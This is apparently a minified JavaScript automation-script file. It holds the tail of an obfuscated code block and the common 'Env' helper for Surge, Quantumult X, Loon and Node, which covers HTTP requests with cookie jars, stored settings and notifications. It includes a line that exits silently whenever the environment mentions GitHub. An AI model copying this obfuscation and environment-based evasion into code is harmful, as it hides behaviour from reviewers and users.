_0x1226x22&& _0x1226x1f=== _0x1226x20(__Oxb227b[0x36],__Oxb227b[0x37]))){_0x1226x21(_0x1226x1c)}}catch(e){_0x1226x21(_0x1226x1c)}})({})
function Env(t,e){"undefined"!=typeof process&&JSON.stringify(process.env).indexOf("GITHUB")>-1&&process.exit(0);class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}
